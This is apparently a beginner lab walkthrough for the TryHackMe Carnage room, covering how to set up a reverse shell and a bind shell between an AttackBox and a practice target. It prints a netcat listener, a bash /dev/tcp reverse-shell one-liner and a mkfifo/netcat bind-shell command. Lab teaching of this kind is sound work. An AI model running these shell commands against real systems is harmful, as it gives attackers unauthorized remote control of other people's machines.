# HackerFrogs AfterSchool Network Hacking Session 4
## Session Topic: Bind and Reverse Shells /w TryHackMe
# Challenge 1: TryHackMe Carnage Room
## TryHackMe Link
https://tryhackme.com/room/c2carnage
### YouTube Walkthrough Link
https://youtu.be/Aqc0F9i1T04?t=929
### Method of Solve
* Step 1: click on the Task 1 header
* Step 2: click on the green `Start Machine` button
* Step 3: go to the top of the webpage, and click on the "Start AttackBox" button located underneath the cloud icon with the santa hat on it
* Step 4: wait 2 minutes for the AttackBox to finish loading
* Step 5: at the top of the webpage, copy the IP address under the `Target IP Address`. You can click on the icon to the right of the IP address to copy it to your clipboard
* Step 6: click on the control bar located in the middle of the screen, then click on the clipboard button
* Step 7: in the AttackBox desktop, click on the terminal shortcut button to open a terminal
* Step 8: create two separate web browser windows, side by side, with the Carnage target machine on one side, and the AttackBox on the other side
## Part 1: Setting Up and Connecting to a Reverse Shell Connection
* Step 1: In the AttackBox, use the following Netcat command to setup a listener
```
nc -nlvp 8888
```
There is not a listener on the AttackBox on port 8888
* Step 2: On the Carnage machine, use the following command to connect to the AttackBox machine
```
bash -i >& /dev/tcp/<ATTACKBOX_IP>/8888 0>&1
```
In the AttackBox terminal, we are now connected to the Carnage machine as the `ubuntu` user. The reverse shell connection has been established
* Step 3: In the AttackBox, use the following command to close the reverse shell connection
```
exit
```
## Part 2: Setting Up and Connecting to a Bind Shell Connection
* Step 1: In the Carnage machine, use the following Netcat command to setup a bind shell
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 8888 > /tmp/f
```
Now there's a listener on the Caranage machine's port 8888 which can receive incoming connections
* Step 2: In the AttackBox, use the following Netcat command to connect to the Carnage machine
```
nc <CARNAGE_IP> 8888
```
We are now connected to the Carnage machine on the AttackBox machine
